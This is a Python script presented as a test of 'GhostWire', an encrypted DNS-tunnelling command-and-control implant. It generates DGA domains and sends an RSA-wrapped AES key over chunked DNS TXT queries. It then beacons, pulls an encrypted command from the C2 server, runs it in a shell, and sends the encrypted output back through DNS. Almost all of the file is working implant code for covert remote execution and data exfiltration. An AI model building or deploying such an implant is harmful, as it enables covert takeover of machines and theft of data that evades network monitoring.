#!/usr/bin/env python3
"""
GhostWire Encrypted Implant Test
==================================
Tests the full encrypted C2 flow:
1. Generate AES-256 session key
2. RSA-encrypt key, send in chunks during registration
3. Beacon, receive encrypted commands, send encrypted data
"""

import sys
import os
import secrets
import subprocess
import dns.resolver

sys.path.insert(0, os.path.dirname(__file__))

from shared.protocol import (
    MSG_REGISTER, MSG_BEACON, MSG_CMDREQ, MSG_DATA, MSG_EXIT,
    EMPTY_DATA, KEY_END_MARKER, DATA_END_MARKER,
    build_query, MAX_DNS_LABEL
)
from shared.config import (
    C2_DOMAINS, DGA_SEED, DGA_LENGTH, DNS_LISTEN_PORT,
    ENCRYPTION_ENABLED, RSA_PUB_FILE
)
from shared.dga import DGA
from shared.crypto import AESCipher, RSAKeyManager, generate_session_key

# Max chars per DNS label (safe margin below 63)
CHUNK_SIZE = 60


def send_dns_query(query_name, dns_server="127.0.0.1", dns_port=None):
    """Send a DNS query and return the TXT record response."""
    if dns_port is None:
        dns_port = DNS_LISTEN_PORT
    try:
        resolver = dns.resolver.Resolver()
        resolver.nameservers = [dns_server]
        resolver.port = dns_port
        answers = resolver.resolve(query_name, 'TXT')
        for rdata in answers:
            text = b''.join(rdata.strings).decode()
            return text
    except Exception as e:
        return f"ERROR: {e}"


def send_chunked_key(session_id, encrypted_key, dga_label, domain):
    """Send RSA-encrypted AES key in chunks, then signal KEY_END."""
    key_chunks = [encrypted_key[i:i+CHUNK_SIZE] for i in range(0, len(encrypted_key), CHUNK_SIZE)]
    print(f"    Key is {len(encrypted_key)} chars → {len(key_chunks)} chunks")

    for i, chunk in enumerate(key_chunks):
        query = build_query(session_id, MSG_REGISTER, encoded_data=chunk,
                           chunk_num=i, dga_label=dga_label, domain=domain)
        print(f"    → Key chunk {i}/{len(key_chunks)-1} ({len(chunk)} chars)")
        response = send_dns_query(query)
        print(f"    ← Server: {response}")
        if response != "ACK":
            print(f"    ❌ Key chunk {i} failed!")
            return False

    # Send KEY_END signal
    query = build_query(session_id, MSG_REGISTER, encoded_data=KEY_END_MARKER,
                       chunk_num=len(key_chunks), dga_label=dga_label, domain=domain)
    print(f"    → KEY_END signal")
    response = send_dns_query(query)
    print(f"    ← Server: {response}")

    return response == "ACK"


def send_chunked_data(session_id, encrypted_data, dga_label, domain):
    """Send encrypted data in chunks, then signal DONE."""
    data_chunks = [encrypted_data[i:i+CHUNK_SIZE] for i in range(0, len(encrypted_data), CHUNK_SIZE)]
    print(f"    Data is {len(encrypted_data)} chars → {len(data_chunks)} chunks")

    for i, chunk in enumerate(data_chunks):
        query = build_query(session_id, MSG_DATA, encoded_data=chunk,
                           chunk_num=i, dga_label=dga_label, domain=domain)
        print(f"    → Data chunk {i}/{len(data_chunks)-1} ({len(chunk)} chars)")
        response = send_dns_query(query)
        print(f"    ← Server: {response}")

    # Send DONE signal
    query = build_query(session_id, MSG_DATA, encoded_data=DATA_END_MARKER,
                       chunk_num=len(data_chunks), dga_label=dga_label, domain=domain)
    response = send_dns_query(query)
    print(f"    ← Server (DONE): {response}")

    return response == "ACK"


def main():
    dga = DGA(seed=DGA_SEED, length=DGA_LENGTH, domain=C2_DOMAINS[0], backup_domains=C2_DOMAINS[1:])
    session_id = secrets.token_hex(4)
    dga_label = dga.generate_label()

    print("=" * 60)
    print("  GhostWire Encrypted Implant Test")
    print("=" * 60)
    print(f"  Session ID:    {session_id}")
    print(f"  C2 Domain:     {C2_DOMAINS[0]}")
    print(f"  DNS Server:    127.0.0.1:{DNS_LISTEN_PORT}")
    print(f"  DGA Domain:    {dga.generate()}")
    print(f"  Encryption:    {'ENABLED (AES-256 + RSA-2048)' if ENCRYPTION_ENABLED else 'DISABLED'}")
    print("=" * 60)

    # ── Step 1: Generate AES session key ──
    aes_key = generate_session_key()
    aes = AESCipher(aes_key)
    print(f"\n[1] Generated AES-256 session key: {aes_key.hex()[:16]}...")

    # ── Step 2: Encrypt AES key with RSA public key ──
    print("\n[2] Encrypting AES key with RSA-2048 public key...")
    rsa_public = RSAKeyManager.load_public_key(RSA_PUB_FILE)
    encrypted_key = RSAKeyManager.encrypt_key(aes_key, rsa_public)
    print(f"    Encrypted key: {encrypted_key[:32]}... ({len(encrypted_key)} chars)")

    # ── Step 3: Register with server (send encrypted key in chunks) ──
    print("\n[3] Registering with server (chunked key exchange)...")
    success = send_chunked_key(session_id, encrypted_key, dga_label, C2_DOMAINS[0])

    if not success:
        print("    ❌ Registration failed!")
        return
    print("    ✅ Registered with encryption!")

    # ── Step 4: Beacon ──
    print("\n[4] Sending heartbeat beacon...")
    query = build_query(session_id, MSG_BEACON, dga_label=dga_label, domain=C2_DOMAINS[0])
    response = send_dns_query(query)
    print(f"    Server response: {response}")

    # ── PAUSE: Let the user queue a command ──
    print(f"\n{'=' * 60}")
    print(f"  ⚡ Go to your SERVER terminal and type:")
    print(f"\n     cmd {session_id} whoami\n")
    print(f"  Then press ENTER here to check for commands...")
    print(f"{'=' * 60}")
    input("\n  Press ENTER to check for commands...")

    # ── Step 5: Ask for command ──
    print("\n[5] Asking server for a command...")
    query = build_query(session_id, MSG_CMDREQ, dga_label=dga_label, domain=C2_DOMAINS[0])
    response = send_dns_query(query)
    print(f"    Server response: {response[:50]}{'...' if len(response) > 50 else ''}")

    command = None
    if response == "NOOP":
        print("    ℹ️  No commands available. Did you queue one on the server?")
    elif response.startswith("ERROR"):
        print(f"    ❌ Error: {response}")
    else:
        # Try to decrypt the command
        try:
            decrypted = aes.decrypt(response)
            if decrypted.startswith("CMD:"):
                command = decrypted[4:]
                print(f"    📋 Decrypted command: {command}")
            else:
                print(f"    ⚠️  Unexpected decrypted data: {decrypted}")
        except Exception as e:
            print(f"    ⚠️  Failed to decrypt command: {e}")

    # ── Step 6: Execute command and send results ──
    if command:
        print(f"\n[6] Executing: {command}")
        result = subprocess.run(command, shell=True, capture_output=True, text=True, timeout=30)
        output = result.stdout if result.stdout else result.stderr
        output = output.strip()
        print(f"    Output ({len(output)} chars): {output[:80]}{'...' if len(output) > 80 else ''}")

        # Encrypt and send
        print("\n[7] Sending encrypted output...")
        encrypted_output = aes.encrypt(output)
        print(f"    Encrypted output: {len(encrypted_output)} chars")

        success = send_chunked_data(session_id, encrypted_output, dga_label, C2_DOMAINS[0])
        if success:
            print("    ✅ Output sent successfully!")
        else:
            print("    ❌ Failed to send output!")

    # ── PAUSE: Let user check results on server ──
    print(f"\n{'=' * 60}")
    print(f"  ⚡ Go to your SERVER terminal and type:")
    print(f"\n     results {session_id}\n")
    print(f"  Then press ENTER here to exit...")
    print(f"{'=' * 60}")
    input("\n  Press ENTER to exit...")

    # ── Step 8: Exit ──
    print("\n[8] Telling server we're shutting down...")
    query = build_query(session_id, MSG_EXIT, dga_label=dga_label, domain=C2_DOMAINS[0])
    response = send_dns_query(query)
    print(f"    Server response: {response}")

    print("\n" + "=" * 60)
    print("  ✅ Encrypted implant test complete!")
    print("=" * 60)


if __name__ == "__main__":
    main()
